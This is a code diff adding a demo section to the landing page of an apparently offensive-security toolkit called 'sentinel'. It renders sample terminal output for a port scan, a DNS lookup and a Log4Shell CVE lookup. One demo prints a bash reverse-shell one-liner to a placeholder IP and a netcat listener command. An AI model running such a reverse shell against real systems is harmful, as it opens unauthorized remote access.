@@ -26,6 +26,30 @@ export function renderLanding(view, actions) {
   const feature = (icon, t, d) => `<div class="feat-card"><div class="feat-ico">${svg(icon)}</div><h3>${t}</h3><p>${d}</p></div>`;
   const step = (n, t, d) => `<div class="step"><div class="step-n">${n}</div><div><h3>${t}</h3><p>${d}</p></div></div>`;
   const mod = (icon, t, d) => `<div class="mod-card"><div class="mod-ico">${svg(icon)}</div><div><div class="mod-t">${t}</div><div class="mod-d">${d}</div></div></div>`;
+  const demoTerm = (title, body) => `<div class="term-window demo-term"><div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">${title}</span></div><pre class="tw-body">${body}</pre></div>`;
+  const P = '<span class="c-pl">sentinel@kali</span>:<span class="c-path">~</span>$ ';
+  const DEMOS = [
+    ["sentinel — scan", `${P}sentinel scan 10.10.14.7
+<span class="c-mut">PORT   SERVICE   BANNER</span>
+<span class="c-ok">22</span>     ssh       OpenSSH 9.6p1
+<span class="c-ok">80</span>     http      nginx 1.24.0
+<span class="c-ok">443</span>    https
+<span class="c-acc">[+]</span> 3 open ports found`],
+    ["sentinel — recon", `${P}sentinel dns github.com
+A     140.82.112.3
+MX    <span class="c-mut">aspmx.l.google.com</span>
+NS    dns1.p08.nsone.net
+TXT   v=spf1 include:_spf.google.com ~all`],
+    ["sentinel — cve", `${P}sentinel cve log4j
+<span class="c-acc">CVE-2021-44228</span> <span class="c-bad">[CRITICAL 10.0]</span>
+Apache Log4j2 JNDI features do not
+protect against attacker-controlled
+LDAP &mdash; the Log4Shell RCE.`],
+    ["sentinel — payload", `${P}sentinel revshell bash 10.0.0.1 4444
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+<span class="c-mut"># catch it with:</span>
+nc -lvnp 4444`],
+  ];
   const osCard = (name, fmt, os, cmd, note) => `
     <div class="dlapp-item">
       <a class="dlapp-card" href="${APP_FILES[os]}" download><div class="dlapp-os">${name}</div><div class="dlapp-fmt">${fmt}</div></a>
@@ -98,6 +122,15 @@ PORT     STATE SERVICE   VERSION
           ${mod("book", "Cheat sheets", "Copy-paste playbooks for every engagement phase.")}
           ${mod("ai", "Local AI", "Chat and code with private, on-device models.")}
         </div>
+      </div>
+    </section>
+
+    <section class="section" id="demos">
+      <div class="wrap">
+        <div class="eyebrow center">SEE IT IN ACTION</div>
+        <h2 class="sec-title">Point it at a target, get answers</h2>
+        <p class="muted dlapp-sub">The same tools run on the web, the desktop app, and the terminal. Here's a taste.</p>
+        <div class="demo-grid">${DEMOS.map(([t, b]) => demoTerm(t, b)).join("")}</div>
       </div>
     </section>
 
